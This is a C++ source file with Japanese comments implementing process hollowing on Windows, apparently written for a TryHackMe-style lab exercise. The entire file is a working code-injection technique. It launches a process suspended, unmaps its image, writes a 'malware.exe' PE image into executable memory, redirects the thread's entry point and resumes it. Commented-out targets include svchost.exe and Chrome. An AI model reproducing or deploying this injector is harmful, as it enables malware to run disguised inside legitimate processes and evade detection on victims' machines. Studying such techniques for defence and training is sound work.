#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <bits/stdc++.h>

using namespace std;

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef NTSTATUS (NTAPI *pfnZwUnmapViewOfSection)(
  HANDLE ProcessHandle,
  PVOID BaseAddress
);

// NtQueryInformationProcessのプロトタイプ宣言
typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

// PROCESS_BASIC_INFORMATION構造体の定義（64ビット環境用）
typedef struct _PROCESS_BASIC_INFORMATION64 {
    NTSTATUS ExitStatus;
    ULONG64 PebBaseAddress;
    ULONG64 AffinityMask;
    LONG BasePriority;
    ULONG64 UniqueProcessId;
    ULONG64 InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION64;

// プロセスの起動及び管理に関する重要な情報を格納
// CreateProcessAで必須の項目なので空で作成。
LPSTARTUPINFOA target_si = new STARTUPINFOA();

// CreateProcessAで作成されたsvchost.exeのプロセスと主スレッドに関する情報を操作するために使用。
// hProcess: このハンドルを通して、プロセス操作（メモリ書き込み、プロセス終了）などができる。
// hThread: このハンドルを通してスレッドの一時停止や再開、スレッドのコンテキストの取得・設定などができる。
// dwProcessId: プロセスのPID
// dwThreaedId: プロセスの主スレッドID
// 
// プロセス空洞化の後続のステップで使用する。
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();

CONTEXT c;

/*
 * ローカルプロセス： processHollowing.exe
 * ターゲットプロセス： svchost.exe
*/
int main() {
  /*
   * STEP1 正規のプロセスをサスペンドモードで起動する
   */
   
  // TODO: sample.exeでしか実行できない課題を解決
  if (CreateProcessA(
    //(LPSTR)"C:\\Windows\\System32\\svchost.exe", 
    //(LPSTR)"C:\\Users\\yuhei\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
    //(LPSTR)"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    (LPSTR)"sample.exe", 
    NULL, 
    NULL, 
    NULL, 
    FALSE, 
    CREATE_SUSPENDED, // サスペンドモード
    NULL, 
    NULL, 
    target_si, 
    target_pi)) // 成功時にTRUE (非0) を返す
  {
    cout << "Target process created. PID: " << target_pi->dwProcessId << endl;

    // 新たに追加: OpenProcessを使用して高い権限でプロセスハンドルを取得する
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pi->dwProcessId);
    if (hProcess == NULL) {
      cout << "[!] OpenProcess failed. Last Error: " << GetLastError() << endl;
      return 1;
    } else {
      cout << "Process opened with PROCESS_ALL_ACCESS rights." << endl;
    }
  } else {
    cout << "[!] Failed to create Target process. Last Error: " << GetLastError() << endl;
    return 1;
  }
  
  /*
   * STEP2 ローカルプロセスのメモリ領域を確保してそこに悪意あるファイルのコンテンツをターゲットプロセスのメモリに書き込む
   */
  
  /* STEP2-1 悪意あるファイルを開き読み込むため、悪意あるファイルのファイルハンドルを取得 */
  HANDLE hFileMalware = CreateFileA(
	  //(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe",
	  (LPCSTR)"malware.exe",
	  GENERIC_READ,
	  FILE_SHARE_READ,
	  NULL,
	  OPEN_EXISTING,
	  FILE_ATTRIBUTE_NORMAL,
	  NULL
  );
  if (hFileMalware == INVALID_HANDLE_VALUE) {
    cout << "[!] Failed to open malware file. Last Error: " << GetLastError() << endl;
    return 1;
  } else {
    cout << "Malware rfile opened." << endl;
  }
  
  /* STEP2-2 ローカルプロセスにメモリを割りあてる */
  DWORD maliciousFileSize = GetFileSize(
  	hFileMalware,
  	0
  );
  
  PVOID pMaliciousImage = VirtualAlloc(
  	NULL,
  	maliciousFileSize,
  	MEM_RESERVE | MEM_COMMIT, // 0x3000
  	PAGE_READWRITE // 0x04
  );
  if (pMaliciousImage == NULL) {
    cout << "[!] Failed to allocate memory for malicious image. Last Error: " << GetLastError() << endl;
    return 1;
  } else {
      cout << "Memory allocated for malicious image." << endl;
  }
  
  /* STEP2-3 ローカルプロセスのメモリに悪意あるファイルの中身を書き込む */
  DWORD numberOfBytesRead; // Stores number of bytes read

  if (!ReadFile(
  	hFileMalware,       // 悪意あるファイルのファイルハンドルから
  	pMaliciousImage,    // 確保したローカルプロセスのメモリ領域へ書き込む
  	maliciousFileSize,  // 悪意あるファイルのサイズ
  	&numberOfBytesRead, // 読みの進捗管理用ポインタ
  	NULL
  	)) 
  {
  	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
  	TerminateProcess(target_pi->hProcess, 0);
  	return 1;
  } else {
    // 悪意あるファイルのファイルハンドルを閉じる
    cout << "Malicious file read into memory." << endl;
    CloseHandle(hFileMalware);
  }
  
  /* 
   * STEP3 空洞化をおこなう
   */

  // ntdll.dllモジュールのハンドルを取得
  HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); 
  
  // スレッドのコンテキストの整数レジスタの状態を取得して、cに格納。
  //c.ContextFlags = CONTEXT_INTEGER;
  c.ContextFlags = CONTEXT_FULL;
  GetThreadContext(
  	target_pi->hThread,
  	&c
  );
  
  // ターゲットプロセスのメモリからイメージベースアドレスを読み出し変数に格納
  auto NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtdllBase, "NtQueryInformationProcess");
  if (!NtQueryInformationProcess) {
    cout << "Failed to get NtQueryInformationProcess address." << endl;
    return 1;
  }

  // プロセスの基本情報を取得
  PROCESS_BASIC_INFORMATION64 pbi = {};
  ULONG returnLength;
  NTSTATUS status = NtQueryInformationProcess(
    target_pi->hProcess, 
    ProcessBasicInformation, 
    &pbi, 
    sizeof(pbi), 
    &returnLength
  );
  if (status != STATUS_SUCCESS) {
    cout << "NtQueryInformationProcess failed." << endl;
    return 1;
  }

  // PEBのアドレスからイメージベースアドレスを取得
  PVOID pTargetImageBaseAddress;
  SIZE_T bytesRead;
  if (!ReadProcessMemory(
    target_pi->hProcess, 
    (PVOID)(pbi.PebBaseAddress + offsetof(PEB, Reserved3[1])), 
    &pTargetImageBaseAddress, 
    sizeof(pTargetImageBaseAddress), &bytesRead)
  ) {
    cout << "Failed to read image base address from PEB." << endl;
    return 1;
  }

  // ntdll.dllモジュールからZwUnmapViewOfSection関数を動的にロードして変数に格納
  pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
  	hNtdllBase,
  	"ZwUnmapViewOfSection"
  );
  
  // 当的にロードした関数を使用してプロセスを空洞化
  DWORD dwResult = pZwUnmapViewOfSection(
  	target_pi->hProcess,
  	pTargetImageBaseAddress
  );
  if (dwResult != STATUS_SUCCESS) {
    // NTSTATUS コードを直接チェックし、エラー処理を行う
    cout << "[!] Failed to unmap target process memory. NTSTATUS Error: " << dwResult << endl;
    return 1;
  } else {
      cout << "Memory unmapped successfully." << endl;
  }

  /* 
   * STEP4 空洞化したプロセスにメモリを割り当てる
   */
   
  // 悪意あるイメージのDOSヘッダを取得
  PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
  
  // 悪意あるイメージのNTヘッダを取得
  PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); 
  
  // 悪意あるイメージの全体サイズを取得
  DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
  
  // ターゲットプロセスの空洞化された領域に悪意あるイメージのサイズ分のメモリ領域を確保する
  PVOID pHollowAddress = VirtualAllocEx(
  	target_pi->hProcess,      // ターゲットプロセスハンドル
  	pTargetImageBaseAddress,  // ターゲットの空洞化された領域
  	sizeOfMaliciousImage,     // 割り当てるメモリのサイズ（悪意あるイメージのサイズ)
  	MEM_RESERVE | MEM_COMMIT, // メモリの状態：予約およびコミット
  	PAGE_EXECUTE_READWRITE    // メモリ領域オプション：実行、読み書きが可能
  );
  
  // 確保したメモリ領域の最初に、悪意あるイメージのイメージヘッダを書き込む
  if (!WriteProcessMemory(
  	target_pi->hProcess,
  	pHollowAddress,                           // 空洞化して確保したアドレス
  	pMaliciousImage,                          // 悪意あるイメージ全体
  	pNTHeaders->OptionalHeader.SizeOfHeaders, // 書き込むデータサイズ（ヘッダー分）
  	NULL
  )) {
  	std::cout<< "[!] Writting Headers failed. Error: " << GetLastError() << std::endl;
  }
  
  // 次に悪意あるイメージの各PEセクションヘッダーを確保したメモリ領域に追加で書き込む
  for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
    // 現在のPEセクションヘッダーを取得
  	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

    // ターゲットのプロセスのメモリにセクションの内容を書き込む  
    // データソースやコードも書き込まれる
  	WriteProcessMemory(
  		target_pi->hProcess,
  		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress),    // データを書き込む開始アドレス
  		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // セクションのデータ
  		pSectionHeader->SizeOfRawData,                                       // セクションのデータから書き込むデータサイズ
  		NULL
  	);
  }
  
  if (pHollowAddress == NULL) {
    cout << "[!] Failed to allocate memory in target process. Error: " << GetLastError() << endl;
    return 1;
  } else {
      cout << "Memory allocated in target process." << endl;
  }
  
  // STEP5 RAXレジスタの値を変更してエントリポイントを悪意あるものに差し替え
  c.Rax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

  if (!SetThreadContext(
  	target_pi->hThread,
  	&c
  )) {
     cout << "[!] Failed to set thread context. Error: " << GetLastError() << endl;
    return 1;
  }
  
  // STEP6 元のプロセスの一時停止を解除
  DWORD resumeResult = ResumeThread(target_pi->hThread);
  if (resumeResult == (DWORD)-1) { // Check for error condition
    cout << "[!] Failed to resume the thread. Error: " << GetLastError() << endl;
    return 1;    
  } else {
    cout << "Thread resumed. Process hollowing should now be complete. Previous suspend count was: " << resumeResult << endl;
  }
  
  return 0;
}